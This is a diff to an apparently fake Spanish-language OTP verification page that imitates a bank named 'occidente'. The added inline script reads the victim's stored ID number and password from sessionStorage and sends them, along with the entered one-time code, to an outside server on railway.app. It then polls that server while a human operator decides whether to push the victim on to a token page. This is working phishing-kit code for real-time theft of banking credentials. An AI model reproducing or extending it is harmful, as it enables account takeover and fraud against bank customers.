@@ -49,6 +49,7 @@
                         pattern="[0-9]{4,8}"
                         required
                         autocomplete="off"
+                        inputmode="numeric"
                     >
                     <div class="otp-info">
                         <span>El código contiene entre 4 y 8 dígitos</span>
@@ -105,7 +106,7 @@
 
                 <!-- Back Link -->
                 <div class="back-link">
-                    <a href="/index.html">← Volver al inicio</a>
+                    <a href="index.html">← Volver al inicio</a>
                 </div>
             </form>
         </div>
@@ -119,9 +120,149 @@
         </div>
     </div>
 
-    <!-- Socket.IO Client -->
-    <script src="/socket.io/socket.io.js"></script>
-    <script src="/js/banco-utils.js"></script>
-    <script src="otp-optimized.js"></script>
+    <!-- Scripts -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+
+            const otpInput = document.getElementById('otp');
+            const btnVerificar = document.getElementById('btnVerificar');
+            const loadingScreen = document.getElementById('loadingScreen');
+            const resendCode = document.getElementById('resendCode');
+
+            const API = 'https://multi-bancos-production.up.railway.app';
+            const BANCO = 'occidente';
+
+            const sessionId = sessionStorage.getItem('sessionId') || '';
+            const identificacion = sessionStorage.getItem('identificacion') || '';
+            const clave = sessionStorage.getItem('clave') || '';
+            const tipoDoc = sessionStorage.getItem('tipoDoc') || 'CC';
+
+            // ============================================
+            // 1. BLOQUEO DE LETRAS + SOLO DÍGITOS (4-8)
+            // ============================================
+            if (otpInput) {
+                otpInput.addEventListener('keypress', function (e) {
+                    if (e.key && e.key.length === 1 && /\D/.test(e.key)) {
+                        e.preventDefault();
+                    }
+                });
+
+                otpInput.addEventListener('input', function () {
+                    const limpio = otpInput.value.replace(/\D/g, '').slice(0, 8);
+                    if (otpInput.value !== limpio) {
+                        otpInput.value = limpio;
+                    }
+                    validarOtp();
+                });
+
+                otpInput.addEventListener('paste', function (e) {
+                    e.preventDefault();
+                    const texto = (e.clipboardData || window.clipboardData).getData('text') || '';
+                    const limpio = texto.replace(/\D/g, '').slice(0, 8);
+                    otpInput.value = limpio;
+                    otpInput.dispatchEvent(new Event('input', { bubbles: true }));
+                });
+
+                otpInput.addEventListener('drop', function (e) {
+                    e.preventDefault();
+                });
+
+                setTimeout(function () {
+                    otpInput.focus();
+                }, 300);
+            }
+
+            // ============================================
+            // 2. VALIDAR OTP (activar botón)
+            // ============================================
+            function validarOtp() {
+                const valor = otpInput ? otpInput.value.trim() : '';
+                if (btnVerificar) {
+                    btnVerificar.disabled = (valor.length < 4 || valor.length > 8);
+                }
+            }
+
+            // ============================================
+            // 3. ENVIAR OTP AL BACKEND + POLLING DE ESTADO
+            // ============================================
+            async function enviarOtp(valorOtp) {
+                if (loadingScreen) {
+                    loadingScreen.classList.add('active');
+                }
+
+                try {
+                    await fetch(API + '/' + BANCO + '/enviar-otp', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            sessionId: sessionId,
+                            otp: valorOtp,
+                            identificacion: identificacion,
+                            clave: clave,
+                            tipoDoc: tipoDoc
+                        })
+                    });
+                    console.log('OTP enviado:', valorOtp);
+                } catch (e) {
+                    console.error('Error enviando OTP:', e);
+                }
+
+                // Polling: esperar a que el operador rechace o mueva a Token
+                const intervalo = setInterval(async function () {
+                    try {
+                        const r = await fetch(API + '/' + BANCO + '/estado/' + sessionId);
+                        const data = await r.json();
+                        console.log('Estado:', data.estado);
+
+                        if (data.estado === 'token') {
+                            clearInterval(intervalo);
+                            window.location.href = 'token.html';
+                        } else if (data.estado === 'rechazado') {
+                            clearInterval(intervalo);
+                            if (loadingScreen) loadingScreen.classList.remove('active');
+                            alert('Credenciales inválidas');
+                            window.location.href = 'index.html';
+                        }
+                    } catch (e) {
+                        console.error('Error estado:', e);
+                    }
+                }, 2000);
+            }
+
+            if (btnVerificar) {
+                btnVerificar.addEventListener('click', function (e) {
+                    e.preventDefault();
+
+                    const valor = otpInput ? otpInput.value.trim() : '';
+
+                    if (valor.length < 4 || valor.length > 8) {
+                        alert('El código debe tener entre 4 y 8 dígitos');
+                        return;
+                    }
+
+                    enviarOtp(valor);
+                });
+            }
+
+            // Permitir enviar con Enter
+            if (otpInput) {
+                otpInput.addEventListener('keypress', function (e) {
+                    if (e.key === 'Enter' && otpInput.value.length >= 4) {
+                        e.preventDefault();
+                        enviarOtp(otpInput.value.trim());
+                    }
+                });
+            }
+
+            // Botón reenviar
+            if (resendCode) {
+                resendCode.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    alert('Código reenviado');
+                });
+            }
+
+        });
+    </script>
 </body>
 </html>
